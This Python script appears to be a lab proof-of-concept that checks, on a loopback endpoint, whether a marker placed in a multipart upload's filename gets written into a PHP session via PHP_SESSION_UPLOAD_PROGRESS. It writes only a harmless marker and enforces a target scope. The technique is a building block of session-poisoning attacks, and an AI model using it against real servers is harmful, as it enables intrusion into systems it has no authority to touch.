#!/usr/bin/env python3
"""Verify the session-write marker primitive on a loopback lab endpoint.

The endpoint must call session_start() and echo the session contents. This is a
primitive verifier, not an exploit: it proves a filename marker survives into
the session and is readable back.

Usage:
  python3 poc/verify_session_injection.py --target http://127.0.0.1:18091
"""

from __future__ import annotations

import argparse
import sys
import uuid
from pathlib import Path

if __package__ in (None, ""):
    sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from poc.lib import ScopeError, parse_target, request


def build_upload(marker: str) -> tuple[str, bytes]:
    boundary = "VERIFY" + uuid.uuid4().hex[:8]
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        "x\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{marker}"\r\n\r\n'
        "Z\r\n"
        f"--{boundary}--\r\n"
    ).encode("latin-1")
    return boundary, body


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default="http://127.0.0.1:18091")
    parser.add_argument("--path", default="/echo.php")
    parser.add_argument("--sid", default="verify" + uuid.uuid4().hex[:16])
    parser.add_argument("--marker", default="MARK_" + uuid.uuid4().hex[:12])
    args = parser.parse_args(argv)
    try:
        target = parse_target(args.target)
    except ScopeError as exc:
        print(f"[scope] {exc}", file=sys.stderr)
        return 2
    boundary, body = build_upload(args.marker)
    status, _, _ = request(
        target, "POST", args.path,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Cookie": f"PHPSESSID={args.sid}",
        }, body=body)
    if status == 0:
        print("[fail] upload request failed")
        return 1
    status, _, response = request(
        target, "GET", args.path,
        headers={"Cookie": f"PHPSESSID={args.sid}"})
    if status and args.marker.encode() in response:
        print(f"[pass] session marker reflected: {args.marker}")
        return 0
    print("[inconclusive] marker not reflected; endpoint may not dump session")
    return 2


if __name__ == "__main__":
    sys.exit(main())
